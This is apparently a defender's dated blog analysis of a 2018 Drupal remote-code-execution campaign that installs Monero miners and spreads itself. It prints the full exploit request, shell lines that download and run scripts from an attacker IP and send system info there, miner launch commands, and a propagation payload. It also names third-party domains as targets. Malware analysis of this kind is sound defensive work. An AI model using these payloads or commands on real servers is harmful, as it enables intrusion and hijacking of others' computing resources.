# Drupal Exploit Analysis 

### 21/05/2018

Today I got some weird requests that caught my attention.   
  
XXXXXXXXXX.XXX/?q=user/password&name[#post_render][]=passthru&name[#markup]=wget%20-O%20/tmp/a.sh%20hxxp://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[#type]=markup  
  
Do you remember Drupal? Someone is trying to execute remote code in one of our servers. Let's see what it's trying to do:  
  
The a.sh file contains some interesing things. First of all, it sets up a path to work properly:  
  
>ipath=\`find / -xdev -writable -executable -type d -print | shuf -n 1\`  
  
It searches for directories where, with the user that is executing it, has writable and executable permissions. It will work there.  
  
For statistics purposes (I supose), it makes a request to the resource hxxp://51.255.91.41/zz.php with the type parameter set with the servers info.   
  
>wget -O /dev/null "hxxp://51.255.91.41/zz.php?type=\`uname -a\`"  
  
After that, it downloads another file, a python script. We will analyse that later.  
  
>wget -O $ipath/t.py hxxp://51.255.91.41/scrape2.py  
  
What's the first think It does? Yes, as you thought. It downloads a miner and runs it.  
  
>wget -O $ipath/luk.tgz hxxp://www.lukminer.net/releases/latest.tgz  
>cd $ipath  
>tar -xzvf luk.tgz  
>chmod +x luk-cpu  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc > /dev/null&  
  
Then, it erases itself.  
  
>rm -rf a.sh  
  
It's funny, because it actually **does not run the python script**. It's programmed to do so, but It seems that it's in the development fase T.T'  
In the a.sh has commented the following lines:  
  
>for i in \`seq 1 2\`; do  
>#python $ipath/t.py > /dev/null&  
>done  
  
Let's see what it WILL do:  
  
First of all, it sets some variables:  
  
>threadcount = 25  
>timeout = 5  
>serverurl = "hxxp://51.255.91.41/y.php"  
>domain_queue = Queue()  
>threads = []  
  
Here we find what seems a whitelist domain list:  
  
>bl = ['facebook', 'ebay', 'linkedin', '.gov', 'microsoft', 'google']  
  
We don't want to bother the big guys >.<  
And it has a **propagation** function named drupal:  
  
>def drupal(target)  
  
It crafts the url with the payload and makes the request.  
  
>payload = "name[%23post_render][]=passthru&name[%23markup]=wget%20-O%20/tmp/a.sh%20hxxp://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[%23type]=markup"  
                  
>url = target + "?q=user/password&" + payload  
  
How gets the next targets? It asks the server (serverurl) for an URL list to target. It gets the following response (actual response):  
  
>hxxp://www.komornikrzeszow.com/  
>hxxp://www.labkotec.se/  
>hxxps://inl.info.ucl.ac.be/  
>hxxp://www.austrolinks.info/  
>hxxp://www.proedgekettlebells.com/  
  
  
After it has the new victim list, it calls a "scrapedomain" function that tries to guess if the domain has drupal or not and if it has drupal, tries to exploit the victim's domain.  
  
**It has no persistency mechanism so far.**


### 22/05/2018 (UPDATE)

Well, It's evolving. We have an update. Now it adds another file:  

>wget -O /dev/null "hxxp://51.255.91.41/zz.php?type=\`uname -a\`"  
>wget -O $ipath/php5 hxxp://51.255.91.41/php5  
>wget -O $ipath/t.py hxxp://51.255.91.41/scrape2.py  

The php5 file is just another miner:  

>md5sum php5   
>7ac1ed7f6aec0fbc7ad2e89eb20e71dc  php5  

But it seems that is a better one, because It preferres this  instead of the other one:  

>$ipath/php5 -o 51.255.91.41:443 -u auto -p x --max-cpu-usage=100 --donate-level=1 -B  
>if [ $? -eq 0 ]; then  
>    echo "."  
>else  
>        wget -O $ipath/luk.tgz hxxp://www.lukminer.net/releases/latest.tgz  
>        cd $ipath  
>        wget -O $ipath/startit.sh hxxp://51.255.91.41/startit.sh  
>        tar -xzvf luk.tgz  
>        chmod +x luk-cpu  
>        #./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc > /dev/null&  
>        sh ./startit.sh > /dev/null&  
>fi  

And it downloads a "startit.sh" file (like He-Who-Must-Not-Be-Named), but it just runs the miner:  

>for x in \`seq 1 1000\`; do  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc  
>done  

Now it actually propagates it (in fact, this time I've received the exploit from another server). Which means, that our server is in its list:  

>for i in \`seq 1 2\`; do  
>python $ipath/t.py > /dev/null&  
>done  

In the **compromised_servers_22052018.txt** file are the servers which attacked our server. It seems that they are compromised.  

**It will be continued...**  

### 23/05/2018 (UPDATE)  

**Added the list of compromised servers of 23/05/2018 and also the domain list it is targeting.**  

### 24/05/2018 (UPDATE)  

Disappointing news. Today, in the version 3 release, there's only coding improvements.  

Instead of killing all the other miners this way:  

>kill -9 \`pidof php5\`  
>kill -9 \`pidof python\`  
>kill -9 \`pidof luk-cpu\`  
>kill -9 \`pidof xmrig\`  
>kill -9 \`pidof xmrig-cpu\`  

It has noticed that there could be more than one thread, so it adds a loop:  

>for i in \`pidof luk-cpu\`; do  
>   pid=$i  
>   ppid=\`ps -p $pid -o ppid=\`  
>   kill -9 $ppid $pid  
>done  
>for i in \`pidof php5\`; do  
>   pid=$i  
>   ppid=\`ps -p $pid -o ppid=\`  
>   kill -9 $ppid $pid  
>done  

Other change is the way it runs the miner. Now, if the following sentence goes wrong:  

>$ipath/php5 -o 51.255.91.41:443 -u auto -p x --max-cpu-usage=100 --donate-level=1 -B  

It downloads another file, startit2.sh. Like startit.sh, just runs the miner. Let's see  the differences:  

startit2.sh  
>for i in \`seq 1 1000\`; do  
>./php5 -o 51.255.91.41:443 -u auto2 -p x --max-cpu-usage=100 --donate-level=1  
>done  

startit.sh  
>for x in \`seq 1 1000\`; do  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc  
>done  

And if that also doesn't work, it downloads the luk miner as its last option.  

**Added the list of compromised servers of 24/05/2018**
